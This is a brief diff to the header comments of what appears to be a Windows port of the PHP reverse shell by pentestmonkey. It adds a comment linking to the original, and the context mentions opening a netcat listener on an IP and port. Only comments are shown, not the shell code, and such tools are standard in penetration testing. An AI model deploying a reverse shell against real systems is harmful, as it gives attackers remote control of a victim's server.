@@ -1,6 +1,7 @@
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+// original one availlable here github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
 // Fab windows version
 // Open one nc on $ip:$port 
